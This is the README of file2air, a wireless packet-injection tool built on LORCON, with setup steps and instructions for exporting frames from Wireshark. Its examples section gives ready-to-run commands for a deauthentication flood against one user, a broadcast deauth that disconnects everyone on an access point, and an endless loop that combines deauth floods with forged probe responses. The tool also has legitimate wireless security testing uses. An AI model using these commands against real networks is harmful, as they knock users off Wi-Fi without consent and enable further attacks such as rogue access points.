file2air v1.1 - inject 802.11 packets from binary files <jwright@hasborg.com>


ABOUT

file2air uses the LORCON (http://802.11ninja.net) to inject packets into an
802.11 network, using a binary input file for the transmission information.
I've included a few sample packets in the ./packets/ directory for testing
purposes.

file2air will read the binary input file and transmit the contents onto a
wireless network.  It is assumed the input file is a valid 802.11 packet, with
an appropriate 802.11 header. Through command line options, the user can
override the destination, source and BSSID addresses, sequence number and
other fields with command-line arguments, and can specify the number of
packets to send with an arbitrary delay between each packet.


SETUP

In order to use file2air, you must have LORCON installed on your system,
with a supported wireless card and driver configuration.  See the LORCON
website at http://802.11ninja.net for more information.


GETTING PACKETS

You can create arbitrary packets with any hex editor, but having a starting
point is handy.  Using Wireshark, highlight the frame you want to use as
your starting point, and click on the frame contents.  With the approrpriate
frame bytes highlighted, click File -> Export -> Selected Packet Bytes and
save the contents as a file.  Modify this file as needed (if at all) and
then pass the filename to file2air with the -r argument.


EXAMPLES

- DoS a single user with a repeated deauthentication flood:

  ./file2air -i wlan0 -n 65000 -d 00:01:02:03:04:05 -s 00:40:96:01:02:03 \
             -b 00:40:96:01:02:03 -f ./packets/deauth.bin

  Where 00:01:02:03:04:05 is the victim MAC, and 00:40:96:01:02:03 is the AP
  they are associated with (err, were associated with).

- DoS all the users on an AP:

  ./file2air -i wlan0 -n 65000 -d ff:ff:ff:ff:ff:ff -s 00:40:96:01:02:03 \
             -b 00:40:96:01:02:03 -f ./packets/deauth.bin

- Something much more devious:

  /bin/bash -c "while : ; do
     ./file2air -i wlan0 -n 3 -d ff:ff:ff:ff:ff:ff -s 00:40:96:01:02:03 \
                -b 00:40:96:01:02:03 -f ./packets/deauth.bin
     ./file2air -i wlan0 -n 100 -d ff:ff:ff:ff:ff:ff -s 00:40:96:01:02:03 \
                -b 00:40:96:01:02:03 -f ./packets/proberesp.bin
  done"
